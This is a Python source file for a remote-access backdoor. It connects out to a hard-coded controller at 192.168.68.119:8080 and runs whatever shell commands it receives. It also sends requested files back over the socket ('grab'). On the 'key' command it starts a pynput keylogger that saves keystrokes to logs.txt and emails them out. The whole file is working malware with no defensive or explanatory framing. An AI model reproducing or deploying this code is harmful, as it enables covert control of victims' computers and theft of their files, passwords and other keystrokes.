import socket
import subprocess
import os
from pynput import keyboard
from pynput.keyboard import Key, Listener
from mailer import Mailer
import sendEmail


def WhenPressKey(key):
    fp = open("logs.txt", "a")
    print(key)
    if key != keyboard.Key.end:
        fp.write(str(key) + ",")
    else:
        print('End Listening')
        fp.close()
        res = open('logs.txt', 'r')
        sendEmail.sendMail(res.read())

        return False


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

s = socket.socket()
def connecting():

    s.connect(("192.168.68.119", 8080))

    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass

        elif 'key' in command.decode():
            with Listener(on_press=WhenPressKey) as listener:
                listener.join()




        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())


def main():
    connecting()


main()
